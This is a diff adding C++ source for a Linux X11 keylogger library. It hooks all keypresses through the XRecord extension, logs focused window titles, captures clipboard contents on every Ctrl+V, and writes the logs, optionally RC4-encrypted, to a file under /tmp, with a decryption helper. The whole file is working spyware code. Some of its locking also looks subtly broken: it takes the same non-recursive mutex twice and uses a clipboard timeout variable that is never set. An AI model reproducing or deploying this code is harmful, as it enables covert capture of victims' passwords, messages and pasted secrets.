@@ -1,0 +1,660 @@
+#include "encryption.h"
+#include "helper.h"
+#include "keylogger.h"
+#include "keymap.h"
+
+#include <atomic>
+#include <cstdarg>
+#include <cstring>
+#include <ctime>
+#include <fcntl.h>
+#include <fstream>
+#include <iostream>
+#include <mutex>
+#include <sstream>
+#include <thread>
+#include <unordered_map>
+
+#include "sha256.h"
+
+#include <X11/keysym.h>
+#include <X11/Xlib.h>
+#include <X11/Xutil.h>
+#include <X11/extensions/record.h>
+#include <csignal>
+
+namespace ns2095 {
+    static const std::string DEFAULT_LOG_FILE = "/tmp/log/logkeys_XXXXX.txt";
+    static const std::string KEY_LOG_FILE = "XXXXX";
+    static const char* icon_paste = "📋";
+    static std::atomic<bool> signal_received{false};
+
+    class KeyloggerAction::Impl {
+    public:
+        std::thread logThread;
+        std::mutex logMutex;
+        std::atomic<bool> logging;
+        std::string outputFileName;
+        struct tm duration;
+
+        struct timeval tv;
+        fd_set fds;
+
+        std::vector<LogHistory> loghistory;
+        std::vector<std::string> log;
+
+        bool setLogAsFile;
+        EncType encMethod;
+        unsigned char KEY[32];
+        encryption::RC4State rc4_state;
+
+        std::ofstream outFile;
+
+        bool initialize();
+        bool run();
+        int write_encrypt(const std::string& input);
+        void recordFunc();
+        void processRecordedEvent(XRecordInterceptData *data);
+        static void callback(XPointer ptr, XRecordInterceptData *data) {
+            ((Impl*)ptr)->processRecordedEvent(data);
+        }
+
+        std::string getWindowTitle(Window win) const;
+        std::string getClipboard(const XEvent& ev, std::string& keystr);
+        void DestructiveClass();
+        void flushCurrentBuffer();
+        void addWindowHeader(const std::string& header);
+
+        Display* display;
+        Display* data_dpy;
+        XRecordContext context;
+        std::thread record_thread;
+        Window root;
+        Window selwin;
+        Window currentFocus;
+        std::string currentTitle;
+        std::string currentBuffer;
+        std::unordered_map<std::string, std::string> displayWindow;
+
+        unsigned long MAX_CLIPBOARD;
+        std::string clipboardData;
+        Atom bufid;
+        Atom fmtid;
+        Atom strid;
+        Atom propid;
+        Atom incrid;
+        Atom nameid;
+
+        bool waitingForSelection;
+        bool isIncr;
+        int clipFormat;
+        std::chrono::milliseconds clipboardTimeout{500};
+    };
+
+    static std::string g_err;
+    static std::string cur_line;
+    static LogHistory log_entry;
+
+    void signal_handler(int sig) {
+        signal_received.store(true, std::memory_order_release);
+    }
+
+    bool is_empty(const unsigned char* data, size_t len) {
+        for (size_t i = 0; i < len; ++i) {
+            if (data[i] != 0) return false;
+        }
+        return true;
+    }
+
+#pragma region LogRegion
+    void KeyloggerAction::Impl::flushCurrentBuffer() {
+        std::lock_guard<std::mutex> lock(logMutex);
+        if (!currentBuffer.empty()) {
+            if (setLogAsFile && outFile.is_open()) {
+                if (encMethod == Raw) {
+                    outFile << currentBuffer << std::endl;
+                } else if (encMethod == RC4) {
+                    write_encrypt(currentBuffer);
+                    outFile << std::endl;
+                }
+            }
+            log.push_back(currentBuffer);
+            std::cout << currentBuffer << std::endl;
+            currentBuffer.clear();
+        }
+    }
+
+    int KeyloggerAction::Impl::write_encrypt(const std::string& input) {
+        std::vector<char> buf(input.begin(), input.end());
+        size_t len = buf.size();
+        for (size_t i = 0; i < len; i++)
+            buf[i] ^= encryption::RC4_next_byte(rc4_state);
+        outFile.write(buf.data(), len);
+        return static_cast<int>(outFile.good() ? len : 0);
+    }
+
+    void KeyloggerAction::Impl::addWindowHeader(const std::string& header) {
+        if (header.empty()) return;
+        std::lock_guard<std::mutex> lock(logMutex);
+        log.push_back(header);
+        std::cout << header << std::endl;
+        if (setLogAsFile && outFile.is_open()) {
+            if (encMethod == Raw) {
+                outFile << header << std::endl;
+            } else if (encMethod == RC4) {
+                write_encrypt(header);
+                outFile << std::endl;
+            }
+        }
+    }
+
+    void KeyloggerAction::Impl::processRecordedEvent(XRecordInterceptData *data) {
+        if (data->category == XRecordFromServer) {
+            unsigned char type = data->data[0];
+            if (type == KeyPress) {
+                XKeyEvent *ev = (XKeyEvent*)data->data;
+                std::lock_guard<std::mutex> lock(logMutex);
+                if (ev->window != currentFocus) {
+                    flushCurrentBuffer();
+                    currentFocus = ev->window;
+                    currentTitle = getWindowTitle(currentFocus);
+                    if (!currentTitle.empty()) {
+                        std::string WindowHeader = "[" + helper::GetCurrentTimeAsString() + " " + currentTitle + "]";
+                        addWindowHeader(WindowHeader);
+                        displayWindow[currentTitle] = WindowHeader;
+                    }
+                }
+
+                char buf[32] = { 0 };
+                KeySym ks;
+                XComposeStatus compose;
+                int len = XLookupString(ev, buf, sizeof(buf) - 1, &ks, &compose);
+                buf[len] = '\0';
+                std::string keystr;
+                bool isCtrlV = (ev->state & ControlMask) && (ks == XK_v || ks == XK_V);
+                if (isCtrlV) {
+                    if (waitingForSelection) {
+                        keystr = "<busy>📋";
+                    } else {
+                        keystr = icon_paste;
+                        clipFormat = 0;
+                        XConvertSelection(display, bufid, fmtid, propid, selwin, ev->time);
+                        waitingForSelection = true;
+                        isIncr = false;
+                        clipboardData.clear();
+                    }
+                } else if (ks == XK_Return || ks == XK_KP_Enter) {
+                    keystr = "<Enter>";
+                } else if (len > 0 && buf[0] != '\0') {
+                    keystr = std::string(buf);
+                }
+                if (!keystr.empty()) {
+                    currentBuffer += keystr;
+                    if (ks == XK_Return || ks == XK_KP_Enter) {
+                        flushCurrentBuffer();
+                    }
+                }
+            }
+        }
+        XRecordFreeData(data);
+    }
+
+    void KeyloggerAction::Impl::recordFunc() {
+        XRecordEnableContext(data_dpy, context, callback, (XPointer)this);
+    }
+
+    bool KeyloggerAction::Impl::run() {
+        if (!display || !g_err.empty()) {
+            g_err += "Display not initialized or previous error: " + g_err;
+            return false;
+        }
+        if (setLogAsFile) {
+            outFile.open(outputFileName, std::ios::app);
+            if (!outFile.is_open()) {
+                std::stringstream ss;
+                ss << std::hex << (ERROR_FOPEN + errno);
+                g_err += ss.str();
+                return false;
+            }
+        }
+
+        XRecordRange *rr = XRecordAllocRange();
+        if (!rr) {
+            g_err += "Failed to allocate XRecordRange";
+            return false;
+        }
+        rr->device_events.first = KeyPress;
+        rr->device_events.last = KeyPress;
+        XRecordClientSpec rcs = XRecordAllClients;
+        context = XRecordCreateContext(display, 0, &rcs, 1, &rr, 1);
+        XFree(rr);
+        if (!context) {
+            g_err += "Failed to create XRecord context";
+            return false;
+        }
+
+        record_thread = std::thread(&Impl::recordFunc, this);
+
+        std::string WindowHeader;
+        int revert_to;
+        XGetInputFocus(display, &currentFocus, &revert_to);
+        if (currentFocus == PointerRoot || currentFocus == None) {
+            currentFocus = root;
+        }
+        currentTitle = getWindowTitle(currentFocus);
+        if (!currentTitle.empty()) {
+            WindowHeader = "[" + helper::GetCurrentTimeAsString() + " " + currentTitle + "]";
+            addWindowHeader(WindowHeader);
+            displayWindow[currentTitle] = WindowHeader;
+        }
+
+        bool timeout = false;
+        auto durationInSeconds = tmToSeconds(&duration);
+        if (durationInSeconds > 0) timeout = true;
+
+        auto start_time = std::chrono::steady_clock::now();
+        auto end_time = timeout ? start_time + std::chrono::seconds(durationInSeconds) : start_time;
+
+        int xfd = ConnectionNumber(display);
+
+        waitingForSelection = false;
+        isIncr = false;
+        clipFormat = 0;
+        std::chrono::steady_clock::time_point selectionStart;
+
+        while (logging.load(std::memory_order_acquire) && !signal_received.load(std::memory_order_acquire)) {
+            if (timeout && std::chrono::steady_clock::now() >= end_time) {
+                break;
+            }
+
+            FD_ZERO(&fds);
+            FD_SET(xfd, &fds);
+
+            tv.tv_sec = 0;
+            tv.tv_usec = 100000; // 100ms
+
+            int ret = select(xfd + 1, &fds, nullptr, nullptr, &tv);
+            if (ret < 0) {
+                if (errno == EINTR) continue;
+                g_err += "Select error: " + std::to_string(errno);
+                break;
+            }
+            bool eventProcessed = false;
+            if (ret > 0 && FD_ISSET(xfd, &fds)) {
+                while (XPending(display) > 0) {
+                    XEvent ev;
+                    XNextEvent(display, &ev);
+                    eventProcessed = true;
+
+                    switch (ev.type) {
+                        case SelectionNotify:
+                        case PropertyNotify: {
+                            std::string clipResult = getClipboard(ev, currentBuffer);
+                            if (!clipResult.empty()) {
+                                std::lock_guard<std::mutex> lock(logMutex);
+                                currentBuffer += clipResult;
+                                flushCurrentBuffer();
+                            }
+                            break;
+                        }
+                        default:
+                            break;
+                    }
+                }
+            }
+            if (waitingForSelection && eventProcessed &&
+                std::chrono::steady_clock::now() - selectionStart >= clipboardTimeout) {
+                std::lock_guard<std::mutex> lock(logMutex);
+                currentBuffer += "<clipboard_timeout>📋";
+                waitingForSelection = false;
+                isIncr = false;
+                flushCurrentBuffer();
+            }
+        }
+
+        flushCurrentBuffer();
+        logging.store(false, std::memory_order_release);
+        XRecordDisableContext(display, context);
+        XSync(display, False);
+        record_thread.join();
+        XRecordFreeContext(display, context);
+        if (outFile.is_open()) outFile.close();
+
+        for (const auto& h : displayWindow) {
+            LogHistory tmp{.time = h.first, .key = h.second};
+            loghistory.push_back(tmp);
+        }
+
+        return true;
+    }
+#pragma endregion
+
+#pragma region x11helperRegion
+    std::string KeyloggerAction::Impl::getWindowTitle(Window win) const {
+        if (win == root || win == 0) return "Root";
+        Atom type;
+        int format;
+        unsigned long nitems, bytesafter;
+        unsigned char* prop = nullptr;
+        if (XGetWindowProperty(display, win, nameid, 0, 1024, False, fmtid,
+                               &type, &format, &nitems, &bytesafter, &prop) == Success && prop) {
+            std::string title(reinterpret_cast<char*>(prop));
+            XFree(prop);
+            return title;
+        }
+        XTextProperty name;
+        if (XGetWMName(display, win, &name) == Success && name.value) {
+            std::string title(reinterpret_cast<char*>(name.value));
+            XFree(name.value);
+            return title;
+        }
+        return {};
+    }
+
+    std::string KeyloggerAction::Impl::getClipboard(const XEvent& ev, std::string& keystr) {
+        if (ev.type == SelectionNotify && ev.xselection.selection == bufid) {
+            std::cout << "SelectionNotify" << std::endl;
+            if (ev.xselection.property == None) {
+                if (clipFormat == 0) {
+                    clipFormat = 1;
+                    XConvertSelection(display, bufid, strid, propid, selwin, CurrentTime);
+                    return {};
+                }
+                waitingForSelection = false;
+                return "<no clipboard>📋";
+            }
+
+            Atom actual_type;
+            int format;
+            unsigned long nitems, bytes_after;
+            unsigned char* prop = nullptr;
+
+            XGetWindowProperty(display, selwin, propid, 0, 0, False, AnyPropertyType,
+                               &actual_type, &format, &nitems, &bytes_after, &prop);
+            if (prop) XFree(prop);
+
+            if (actual_type == incrid) {
+                isIncr = true;
+                XDeleteProperty(display, selwin, propid);
+                return {};
+            }
+
+            XGetWindowProperty(display, selwin, propid, 0, (bytes_after / 4) + 1, True, AnyPropertyType,
+                               &actual_type, &format, &nitems, &bytes_after, &prop);
+            if (prop && nitems > 0) {
+                size_t data_size = nitems * (format / 8);
+                size_t copy_size = std::min(data_size, MAX_CLIPBOARD - clipboardData.size());
+                if (copy_size > 0) {
+                    clipboardData.append(reinterpret_cast<char*>(prop), copy_size);
+                }
+                XFree(prop);
+                waitingForSelection = false;
+                return clipboardData + icon_paste;
+            }
+            if (prop) XFree(prop);
+            waitingForSelection = false;
+            return "<no clipboard>📋";
+        }
+        else if (ev.type == PropertyNotify && waitingForSelection && isIncr &&
+                 ev.xproperty.atom == propid && ev.xproperty.state == PropertyNewValue) {
+            std::cout << "PropertyNotify" << std::endl;
+            Atom actual_type;
+            int format;
+            unsigned long nitems, bytes_after;
+            unsigned char* prop = nullptr;
+
+            XGetWindowProperty(display, selwin, propid, 0, LONG_MAX / 4, True, AnyPropertyType,
+                               &actual_type, &format, &nitems, &bytes_after, &prop);
+            if (prop && nitems > 0) {
+                size_t chunk_size = nitems * (format / 8);
+                size_t copy_size = std::min(chunk_size, MAX_CLIPBOARD - clipboardData.size());
+                if (copy_size > 0) {
+                    clipboardData.append(reinterpret_cast<char*>(prop), copy_size);
+                }
+                XFree(prop);
+                if (bytes_after == 0 || clipboardData.size() >= MAX_CLIPBOARD) {
+                    isIncr = false;
+                    waitingForSelection = false;
+                    return clipboardData + icon_paste;
+                }
+                return {};
+            }
+            if (prop) XFree(prop);
+            isIncr = false;
+            waitingForSelection = false;
+            return clipboardData + icon_paste;
+        }
+        return {};
+    }
+#pragma endregion
+
+#pragma region SetGetRegion
+    void KeyloggerAction::setOutputFileName(const std::string& outfileName, EncType type) {
+        if (pImpl->logging.load(std::memory_order_acquire)) {
+            return;
+        }
+        if (outfileName.empty()) {
+            pImpl->outputFileName = replaceString(DEFAULT_LOG_FILE, KEY_LOG_FILE, GetCurrentTimeAsString());
+        } else {
+            pImpl->outputFileName = outfileName;
+        }
+        pImpl->setLogAsFile = true;
+        pImpl->encMethod = type;
+    }
+
+    std::string KeyloggerAction::getOutputFileName() {
+        return pImpl->outputFileName;
+    }
+
+    void KeyloggerAction::setMaxBufferClipboard(unsigned long max_) {
+        if (pImpl->logging.load(std::memory_order_acquire)) {
+            return;
+        }
+        pImpl->MAX_CLIPBOARD = max_;
+    }
+
+    unsigned long KeyloggerAction::getMaxBufferClipboard() {
+        return pImpl->MAX_CLIPBOARD;
+    }
+
+    void KeyloggerAction::setDuration(int seconds) {
+        if (pImpl->logging.load(std::memory_order_acquire)) {
+            return;
+        }
+        if (seconds > 0) {
+            pImpl->duration = secondsToTm(seconds);
+        }
+    }
+
+    void KeyloggerAction::setDuration(struct tm duration_) {
+        if (pImpl->logging.load(std::memory_order_acquire)) {
+            return;
+        }
+        pImpl->duration = duration_;
+    }
+
+    struct tm KeyloggerAction::getDuration() {
+        return pImpl->duration;
+    }
+
+    void KeyloggerAction::setEncryptionKEY(const std::string& key) {
+        if (pImpl->logging.load(std::memory_order_acquire)) {
+            return;
+        }
+        std::string hash32 = sha256(key);
+        unsigned char temp_key[32];
+        hexStringToBytes(hash32, temp_key);
+        memcpy(pImpl->KEY, temp_key, sizeof(pImpl->KEY));
+    }
+
+    std::string KeyloggerAction::getEncryptionKEY() {
+        return bytesToHexString(pImpl->KEY, sizeof(pImpl->KEY));
+    }
+
+    bool KeyloggerAction::getLoggingStatus() {
+        return pImpl->logging.load(std::memory_order_acquire);
+    }
+
+    std::vector<LogHistory> KeyloggerAction::getLogHistory() {
+        return pImpl->loghistory;
+    }
+
+    std::string KeyloggerAction::getLastError() {
+        return g_err;
+    }
+#pragma endregion
+
+#pragma region UtilsRegion
+    std::string GetLastError() {
+        return g_err;
+    }
+
+    bool DecryptFile(const std::string& enc_filename, const std::string& outputfile, const std::string& key) {
+        FILE* inFile = fopen(enc_filename.c_str(), "rb");
+        FILE* outFile = fopen(outputfile.c_str(), "wb");
+        std::stringstream ss;
+        if (!inFile || !outFile) {
+            ss << std::hex << (ERROR_FOPEN + errno);
+            g_err += ss.str();
+            return false;
+        }
+        fseek(inFile, 0, SEEK_END);
+        size_t file_size = ftell(inFile);
+        fseek(inFile, 0, SEEK_SET);
+        unsigned char* enc_data = new unsigned char[file_size];
+        if (fread(enc_data, 1, file_size, inFile) != file_size) {
+            ss << std::hex << (ERROR_READ + errno);
+            g_err += ss.str();
+            delete[] enc_data;
+            fclose(inFile);
+            fclose(outFile);
+            return false;
+        }
+        std::string hash32 = sha256(key);
+        unsigned char temp_key[32];
+        hexStringToBytes(hash32, temp_key);
+        encryption::RC4(temp_key, sizeof(temp_key), enc_data, file_size);
+        if (fwrite(enc_data, 1, file_size, outFile) != file_size) {
+            ss << std::hex << (ERROR_WRITE + errno);
+            g_err += ss.str();
+            delete[] enc_data;
+            fclose(inFile);
+            fclose(outFile);
+            return false;
+        }
+        delete[] enc_data;
+        fclose(inFile);
+        fclose(outFile);
+        return true;
+    }
+#pragma endregion
+
+#pragma region MainRegion
+    bool KeyloggerAction::createInstance(KeyloggerAction& obj) {
+        return obj.pImpl->initialize();
+    }
+
+    bool KeyloggerAction::Impl::initialize() {
+        display = XOpenDisplay(nullptr);
+        if (!display) {
+            g_err += XDisplayName(NULL);
+            return false;
+        }
+
+        data_dpy = XOpenDisplay(nullptr);
+        if (!data_dpy) {
+            g_err += "Failed to open data display";
+            return false;
+        }
+
+        int major, minor;
+        if (!XRecordQueryVersion(display, &major, &minor)) {
+            g_err += "XRecord extension not available";
+            return false;
+        }
+
+        XInitThreads();
+        root = DefaultRootWindow(display);
+        selwin = XCreateSimpleWindow(display, root, -100, -100, 1, 1, 0, 0, 0);
+        XMapWindow(display, selwin);
+        XSelectInput(display, selwin, PropertyChangeMask);
+
+        bufid = XInternAtom(display, "CLIPBOARD", False);
+        propid = XInternAtom(display, "XSEL_DATA", False);
+        fmtid = XInternAtom(display, "UTF8_STRING", False);
+        strid = XInternAtom(display, "STRING", False);
+        incrid = XInternAtom(display, "INCR", False);
+        nameid = XInternAtom(display, "_NET_WM_NAME", False);
+
+        MAX_CLIPBOARD = 1024;
+        logging.store(false, std::memory_order_release);
+        outputFileName.clear();
+        loghistory.clear();
+        duration = {};
+        encMethod = Raw;
+        memset(KEY, 0, sizeof(KEY));
+        waitingForSelection = false;
+        isIncr = false;
+        clipFormat = 0;
+        return true;
+    }
+
+    void KeyloggerAction::Impl::DestructiveClass() {
+        if (selwin) {
+            XDestroyWindow(display, selwin);
+        }
+        if (display) {
+            XCloseDisplay(display);
+        }
+        if (data_dpy) {
+            XCloseDisplay(data_dpy);
+        }
+        if (outFile.is_open()) {
+            outFile.close();
+        }
+    }
+
+    KeyloggerAction::KeyloggerAction() : pImpl(std::make_unique<Impl>()) {}
+
+    KeyloggerAction::~KeyloggerAction() {
+        stopLogging();
+        pImpl->DestructiveClass();
+        if (isSignalHandleSet.load(std::memory_order_acquire)) {
+            unset_signal_handling();
+        }
+    }
+
+    bool KeyloggerAction::startLogging(bool noblock) {
+        if (pImpl->setLogAsFile && pImpl->encMethod == RC4) {
+            if (is_empty(pImpl->KEY, sizeof(pImpl->KEY))) encryption::GenKey(pImpl->KEY, sizeof(pImpl->KEY));
+            encryption::RC4_init(pImpl->rc4_state, pImpl->KEY, sizeof(pImpl->KEY));
+        }
+
+        std::lock_guard<std::mutex> lock(pImpl->logMutex);
+        if (pImpl->logging.load(std::memory_order_acquire)) {
+            std::stringstream ss;
+            ss << std::hex << ERROR_BLOCK;
+            g_err += ss.str();
+            return false;
+        }
+
+        pImpl->logging.store(true, std::memory_order_release);
+        set_signal_handling();
+
+        if (noblock) {
+            pImpl->logThread = std::thread(&KeyloggerAction::Impl::run, pImpl.get());
+            return true;
+        } else {
+            return pImpl->run();
+        }
+    }
+
+    void KeyloggerAction::stopLogging() {
+        std::lock_guard<std::mutex> lock(pImpl->logMutex);
+        pImpl->logging.store(false, std::memory_order_release);
+        if (pImpl->logThread.joinable()) {
+            pImpl->logThread.join();
+        }
+    }
+#pragma endregion
+}
